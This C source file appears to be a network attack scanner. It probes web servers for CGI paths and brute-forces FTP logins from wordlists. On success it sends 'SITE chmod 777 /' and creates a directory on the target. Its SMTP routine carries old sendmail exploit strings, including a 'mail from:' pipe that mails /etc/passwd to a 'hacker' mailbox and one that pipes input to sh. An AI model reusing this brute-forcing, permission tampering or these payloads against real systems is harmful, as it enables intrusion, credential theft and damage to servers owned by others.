#include "scan_core.h"

char buf[512];
struct cgi
{
    char *rmt_host;
    char *url;
    int n;
};

int thread_num = 10;

void* getcgi(void *arg);

int scan_cgi(char* ip_addr)
{
    char rbuff[1024];
    struct cgi mycgi[10];
    char cginame[100][128];
    int ret;
    int sockfd;
    struct sockaddr_in addr;
    pthread_t * thread;
    int i, j;

    FILE *fp = fopen("data/cgi-name.data", "rw");
    char buf[128];

    for (i=0; i<100; i++)
    {
        fgets(cginame[i], 128, fp);
    }
    fclose(fp);
    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0)))
    {
        close(sockfd);
        printf("socket error!\n");
        return -1;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    if (0 > (ret = connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr))))
    {
        close(sockfd);
        log_append("无法连接目标主机，目标没有开发web服务!\n");
        return -1;
    }
    memset(rbuff,0,1024);
    log_append("web server的banner:\n");
    if(sendto(sockfd,"HEAD / HTTP/1.0\n\n",64,0,(void*)&addr,sizeof(struct sockaddr)) < 0)
    {
        close(sockfd);
        printf("Fail to sendto\n");
        return -1;
    }
    sleep(1);
    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
    {
        close(sockfd);
        printf("Fail to recvfrom\n");
        return -1;
    }
    sleep(1);
    memset(buf, 0, 512);
    sprintf(buf, "%s\n", rbuff);
    log_append(buf);

    close(sockfd);

    for(i=0; i<10; i++)
    {
        thread = (pthread_t *)malloc( thread_num * sizeof(pthread_t) );
        for(j=0; j<10; j++)
        {
            mycgi[j].rmt_host=ip_addr;
            mycgi[j].url=cginame[i*10+j];
            mycgi[j].n=j;
            if (pthread_create(&thread[j], NULL, getcgi, (void *)&mycgi[j])!=0)
            {
                printf("pthread_create failed\n");
                free(thread);
                return -1;
            }
        }
        for (j = 0; j < thread_num; ++j )
        {
            pthread_join(thread[j],NULL);
        }
        free(thread);
        thread = NULL;
    }
    return 0;

}

void* getcgi(void *arg)
{
    char rbuff[1024];
    struct cgi* tcgi=(struct cgi *)arg;
    char *hole=tcgi->url;
    char *rmt_host = tcgi->rmt_host;
    char url[256]="GET ";
    char display[256]="";
    int ret;
    int num=tcgi->n;;
    int sockfd;
    struct sockaddr_in addr;
    hole[strlen(hole)-1] = '\0';
    strcat(url, hole);
    strcat(url, " HTTP/1.0\n\n");
    printf("%s\n",url);
    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0)))
    {
        close(sockfd);
        printf("socket error!\n");
        exit(-1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = inet_addr(rmt_host);
    if (0 > (ret = connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr))))
    {
        close(sockfd);
        log_append("无法连接目标主机，目标没有开发web服务!\n");
        return;
    }
    if(sendto(sockfd,url,sizeof(url),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
    {
        close(sockfd);
        printf("Fail to sendto\n");
        exit(-1);
    }
    memset(rbuff,0,1024);
    sleep(1);
    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
    {
        close(sockfd);
        printf("Fail to recvfrom\n");
        exit(-1);
    }
    sleep(1);

    strcat(display, "\tfind");
    strcat(display, hole);
    strcat(display,"\n");
    if (strstr(rbuff,"200 OK")!=NULL)
    {
        log_append(display);
    }
    close(sockfd);
}

int scan_ftp(char* ip_addr)
{
    int port=21;
    char rbuff[1024];
    int sockfd;
    int ret;
    struct sockaddr_in addr;
    FILE *fp = NULL ;
    char buf[128];
    char ftp_name[100][64];
    char ftp_pwd[100][64];
    int count = 2;
    int i, j;
    fp = fopen("data/ftp-name.data", "rw");
    for (i=0; i<count; i++)
    {
        fgets(ftp_name[i], 64, fp);
    }
    fclose(fp);
    fp = NULL;

    fp = fopen("data/ftp-password.data", "rw");
    for (i=0; i<count; i++)
    {
        fgets(ftp_pwd[i], 64, fp);
    }
    fclose(fp);
    fp = NULL;

    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0)))
    {
        close(sockfd);
        printf("socket error!\n");
        exit(-1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    if (0 > (ret = connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr))))
    {
        close(sockfd);
        log_append("无法连接目标主机，目标没有开发ftp服务!\n");
        return -1;
    }

    log_append("ftp server的banner:\n");
    memset(rbuff,0,1024);
    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
    {
        close(sockfd);
        printf("Fail to recvfrom\n");
        return -1;
    }
    sleep(1);
    log_append(rbuff);

    log_append("ftp常见用户密码测试：\r\n");
    for (i=0;i<count;i++)
    {
        memset(rbuff,0,1024);
        char  tmp[64] = "USER ";
        strcat(tmp, ftp_name[i]);
        strcat(tmp, "\r\n");
        if(sendto(sockfd,tmp,sizeof(tmp),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
        {
            close(sockfd);
            printf("Fail to sendto\n");
            exit(-1);
        }
        sleep(1);
        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
        {
            close(sockfd);
            printf("Fail to recvfrom\n");
            exit(-1);
        }
        sleep(1);
        if(strstr(rbuff,"331")!=NULL)
        {
            log_append("有用户名:");
            log_append(ftp_name[i]);
            log_append("\n");
            for (j=0; j<count; j++)
            {
                memset(rbuff,0,1024);
                char  tmp[64] = "PASS ";
                strcat(tmp, ftp_pwd[j]);
                strcat(tmp, "\r\n");
                if(sendto(sockfd,tmp,sizeof(tmp),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
                {
                    close(sockfd);
                    printf("Fail to sendto\n");
                    exit(-1);
                }
                sleep(1);
                if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
                {
                    close(sockfd);
                    printf("Fail to recvfrom\n");
                    exit(-1);
                }
                sleep(1);
                if(strstr(rbuff,"230")!=NULL)
                {
                    log_append("用户名:");
                    log_append(ftp_name[i]);
                    log_append("  密码:");
                    log_append(ftp_pwd[j]);
                    log_append("\n");
                    ///////////////////////////////////////////////////////////////////////
                    memset(rbuff,0,1024);
                    printf("根目录列表：");
                    if(sendto(sockfd,"LIST\r\n",sizeof("LIST\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
                    {
                        close(sockfd);
                        printf("Fail to sendto\n");
                        continue;
                    }
                    sleep(1);
                    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
                    {
                        close(sockfd);
                        printf("Fail to recvfrom\n");
                        exit(-1);
                    }
                    sleep(1);
                    memset(buf, 0, 512);
                    sprintf(buf, "%s\n", rbuff);
                    log_append(buf);

                    memset(rbuff,0,1024);
                    printf("尝试改变主目录属性为可写：");
                    if(sendto(sockfd,"SITE chmod 777 /\r\n",sizeof("SITE chmod 777 /\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
                    {
                        close(sockfd);
                        printf("Fail to sendto\n");
                         continue;
                    }
                    sleep(1);
                    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
                    {
                        close(sockfd);
                        printf("Fail to recvfrom\n");
                        exit(-1);
                    }
                    sleep(1);
                    memset(buf, 0, 512);
                    sprintf(buf, "%s\n", rbuff);
                    log_append(buf);

                    memset(rbuff,0,1024);
                    printf("尝试建立目录：");
                    if(sendto(sockfd,"MKD ftpbug\r\n",sizeof("MKD ftpbug\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
                    {
                        close(sockfd);
                        printf("Fail to sendto\n");
                       continue;
                    }
                    sleep(1);
                    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
                    {
                        close(sockfd);
                        printf("Fail to recvfrom\n");
                        exit(-1);
                    }
                    sleep(1);
                    memset(buf, 0, 512);
                    sprintf(buf, "%s\n", rbuff);
                    log_append(buf);


                    sleep(1);
                    memset(buf, 0, 512);
                    sprintf(buf, "%s\n", rbuff);
                    log_append(buf);
                    if(sendto(sockfd,"QUIT\r\n",sizeof("QUIT\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
                    {
                        close(sockfd);
                        printf("Fail to sendto\n");
                        continue;
                    }
                    sleep(1);
                    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
                    {
                        close(sockfd);
                        printf("Fail to recvfrom\n");
                        exit(-1);
                    }
                    sleep(1);
                }
            }
        }
    }
    return 0;
}

int scan_smtp(char* ip_addr)
{
    int a;
    int rcpt=0,expn=0,vrfy=0,port=25;
    char rbuff[1024];
    char sbuff[50];
    char buff[64];
    char dis[128];
    int sockfd;
    struct  sockaddr_in addr;
    int ret;
    char* username[28]= {"root","test","www","web","sybase","oracle","informix",
                         "guest","sam_exec","+","oracle8","access","user","ftp",
                         "account","backup","owc","datebase","public","info",
                         "wais","news","bbs","adm","sync","john","beijing","china"
                        };
    char* bug[10]= {"","debug","kill","wiz","rcpt to: /tmp/.rhosts","+ +","RSET",
                    "mail from: |/bin/mail hacker < /etc/passwd","RSET",
                    "mail from: |tail|sh"
                   };

    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0)))
    {
        close(sockfd);
        printf("socket error!\n");
        exit(-1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    if (0 > (ret = connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr))))
    {
        close(sockfd);
        printf("connect failed! target didn't open smtp service!\n");
        exit(-1);
    }

    log_append("smtp server的banner:\n");
    memset(rbuff,0,1024);
    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
    {
        close(sockfd);
        printf("Fail to recvfrom\n");
        return -1;
    }
    sleep(1);
    memset(buf, 0, 512);
    sprintf(buf, "%s\n", rbuff);
    log_append(buf);
    if(sendto(sockfd,"HELP\r\n",sizeof("HELP\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
    {
        close(sockfd);
        printf("Fail to sendto\n");
        exit(-1);
    }
    sleep(1);
    memset(rbuff,0,1024);
    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
    {
        close(sockfd);
        printf("Fail to recvfrom\n");
        return -1;
    }
    sleep(1);
    log_append(rbuff);
    if(strstr(rbuff,"RCPT")!=NULL)
    {
        rcpt=1;
        log_append("可以使用RCPT命令获得用户名列表.\r\n");
    }
    if(strstr(rbuff,"VRFY")!=NULL)
    {
        vrfy=1;
        log_append("可以使用VRFY命令获得用户名列表.\r\n");
    }
    if(strstr(rbuff,"EXPN")!=NULL)
    {
        expn=1;
        log_append("可以使用EXPN命令获得用户名列表.\r\n");
    }
    printf("*\n");
//    if(sendto(sockfd,"HELO\r\n",sizeof("HELO\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//    {
//        close(sockfd);
//        printf("Fail to sendto\n");
//        exit(-1);
//    }
//    sleep(1);
//    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//    {
//        close(sockfd);
//        printf("Fail to recvfrom\n");
//        return -1;
//    }
//    sleep(1);
//    if(sendto(sockfd,"HELO\r\n",sizeof("HELO\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//    {
//        close(sockfd);
//        printf("Fail to sendto\n");
//        exit(-1);
//    }
//    sleep(1);
//    memset(rbuff,0,1024);
//    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//    {
//        close(sockfd);
//        printf("Fail to recvfrom\n");
//        return -1;
//    }
//    sleep(1);
//    log_append(rbuff);
//    if(sendto(sockfd,"MAIL FROM:hacker@hacker.com\r\n",sizeof("MAIL FROM:hacker@hacker.com\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//    {
//        close(sockfd);
//        printf("Fail to sendto\n");
//        exit(-1);
//    }
//    sleep(1);
//    memset(rbuff,0,1024);
//    if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//    {
//        close(sockfd);
//        printf("Fail to recvfrom\n");
//        return -1;
//    }
//    sleep(1);
//    log_append(rbuff);

    printf("**\n");
//    if(rcpt)
//    {
//        log_append("尝试利用RCPT命令获得目标机上存在的一些常见用户名：");
//        for(a=0; a<3; a++)
//        {
//            memset(rbuff,0,1024);
//            memset(sbuff,0,50);
//            strncpy(sbuff,"rcpt to:",8);
//            strcat(sbuff,username[a]);
//            strncat(sbuff,"\r\n",2);
//            if(sendto(sockfd,sbuff,sizeof(sbuff),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//            {
//                close(sockfd);
//                printf("Fail to sendto\n");
//                exit(-1);
//            }
//            sleep(1);
//            if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//            {
//                close(sockfd);
//                printf("Fail to recvfrom\n");
//                return -1;
//            }
//            if(strstr(rbuff,"250")!=NULL)
//            {
//               log_append(rbuff);
//            }
//        }//for(a=0;a<28;a++)
//    }//if(rcpt)
//    if(expn)
//    {
//        memset(rbuff,0,1024);
//        printf("\r\n检查decode别名：\r\n");
//        if(sendto(sockfd,"EXPN decode\r\n",sizeof("EXPN decode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        printf("%s\n",rbuff);
//        if(sendto(sockfd,"EXPN decode\r\n",sizeof("EXPN decode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        sleep(1);
//        if(sendto(sockfd,"EXPN uudecode\r\n",sizeof("EXPN uudecode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        memset(rbuff,0,1024);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        printf("%s\n",rbuff);
//    }
//    else
//    {
//        memset(rbuff,0,1024);
//        printf("\r\n检查decode别名：\r\n");
//        if(sendto(sockfd,"VRFY decode\r\n",sizeof("VRFY decode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        printf(rbuff);
//        if(sendto(sockfd,"VRFY decode\r\n",sizeof("VRFY decode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        sleep(1);
//        memset(rbuff,0,1024);
//        if(sendto(sockfd,"VRFY uudecode\r\n",sizeof("VRFY uudecode\r\n"),0,(void*)&addr,sizeof(struct sockaddr)) < 0)
//        {
//            close(sockfd);
//            printf("Fail to sendto\n");
//            exit(-1);
//        }
//        sleep(1);
//        if(recvfrom(sockfd,rbuff,sizeof(rbuff),0,NULL,NULL) < 0)
//        {
//            close(sockfd);
//            printf("Fail to recvfrom\n");
//            return -1;
//        }
//        printf("%s\n",rbuff);
//    }

    close(sockfd);
    return 0;
}
